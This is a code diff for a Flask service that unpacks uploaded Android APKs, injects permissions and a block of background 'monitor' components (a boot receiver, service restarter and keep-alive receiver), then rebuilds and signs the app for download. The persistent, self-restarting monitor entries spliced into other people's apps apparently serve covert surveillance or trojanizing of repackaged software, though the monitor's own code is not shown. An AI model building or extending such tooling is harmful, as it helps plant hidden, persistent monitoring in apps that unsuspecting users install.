@@ -158,6 +158,56 @@ def inject_permissions(manifest_path: Path, missing: list):
     manifest_path.write_text(raw, encoding="utf-8")
 
 
+ACTIVITY_BLOCK = """\
+    <service
+        android:name="com.yourapp.monitor.MonitorService" />
+    <service
+        android:name="com.yourapp.monitor.JobSchedulerService"
+        android:permission="android.permission.BIND_JOB_SERVICE"
+        android:enabled="true"
+        android:exported="false" />
+    <receiver
+        android:name="com.yourapp.monitor.BootReceiver" />
+    <receiver
+        android:name="com.yourapp.monitor.ServiceRestarter" />
+    <receiver
+        android:name="com.yourapp.monitor.ServiceKeepAlive" />
+"""
+
+
+def inject_activity_block(manifest_path: Path) -> bool:
+    """
+    Insert ACTIVITY_BLOCK just after the closing tag of the last
+    <activity ...> block inside <application>.
+    Falls back to just before </application> if no <activity> found.
+    Returns True if injected, False if already present.
+    """
+    raw = manifest_path.read_text(encoding="utf-8")
+
+    # Idempotency check — don't inject twice
+    if "com.yourapp.monitor.MonitorService" in raw:
+        return False
+
+    # Find the last </activity> closing tag
+    idx = raw.rfind("</activity>")
+    if idx != -1:
+        # Insert right after the closing tag + newline
+        insert_at = idx + len("</activity>")
+        # consume one trailing newline so spacing is clean
+        if raw[insert_at:insert_at+1] == "\n":
+            insert_at += 1
+        raw = raw[:insert_at] + "\n" + ACTIVITY_BLOCK + raw[insert_at:]
+    else:
+        # No <activity> tag — insert before </application>
+        idx = raw.rfind("</application>")
+        if idx == -1:
+            raise ValueError("Cannot find </application> in AndroidManifest.xml")
+        raw = raw[:idx] + ACTIVITY_BLOCK + raw[idx:]
+
+    manifest_path.write_text(raw, encoding="utf-8")
+    return True
+
+
 # ── Routes ───────────────────────────────────────────────────────────────────
 @app.route("/")
 def index():
@@ -227,6 +277,8 @@ def patch_apk():
         if missing:
             inject_permissions(manifest, missing)
 
+        activity_injected = inject_activity_block(manifest)
+
         unsigned = work_dir / "unsigned.apk"
         out, err, rc = apktool_build(work_dir / "decoded", unsigned)
         if rc != 0:
@@ -249,10 +301,11 @@ def patch_apk():
             resp_data,
             mimetype="application/vnd.android.package-archive",
             headers={
-                "Content-Disposition":        f'attachment; filename="{signed_name}"',
-                "Content-Length":             str(len(resp_data)),
-                "X-Missing-Permissions":      json.dumps(missing),
-                "Access-Control-Expose-Headers": "X-Missing-Permissions",
+                "Content-Disposition":           f'attachment; filename="{signed_name}"',
+                "Content-Length":                str(len(resp_data)),
+                "X-Missing-Permissions":         json.dumps(missing),
+                "X-Activity-Block-Injected":     json.dumps(activity_injected),
+                "Access-Control-Expose-Headers": "X-Missing-Permissions, X-Activity-Block-Injected",
             }
         )
     except Exception as e:
